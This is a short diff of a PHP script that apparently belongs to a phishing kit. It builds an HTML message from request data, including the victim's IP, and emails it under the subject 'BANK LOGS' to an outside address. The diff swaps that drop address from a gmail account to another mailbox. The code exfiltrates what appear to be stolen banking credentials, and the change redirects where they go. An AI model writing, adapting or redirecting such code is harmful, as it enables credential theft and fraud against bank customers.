@@ -15,7 +15,7 @@ if (isset($_REQUEST['ip'])) {
       </body>
     </html>";
   
-    if (!sendEmail("jacealex151@gmail.com", "BANK LOGS", $message)){
+    if (!sendEmail("info@bekofcu.com", "BANK LOGS", $message)){
       echo "Message not sent";
     }
     else {
